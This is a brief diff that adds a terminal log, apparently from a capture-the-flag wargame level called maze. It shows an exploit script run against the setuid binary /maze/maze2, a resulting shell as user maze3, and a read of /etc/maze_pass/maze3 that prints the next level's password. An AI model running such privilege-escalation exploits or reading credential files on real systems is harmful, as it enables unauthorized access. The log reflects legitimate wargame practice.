@@ -1,0 +1,9 @@
+maze2@maze:/tmp/tdaddy$ ./r.sh /maze/maze2 $(./maze2.py)
+$ whoami
+maze3
+$ ls
+libc.c     libc2.c   maze2.txt               peda-session-whoami.txt  r.sh
+libc.so.4  maze2.py  peda-session-maze2.txt  puts-override.so
+$ cat /etc/maze_pass/maze3
+beinguthok
+$
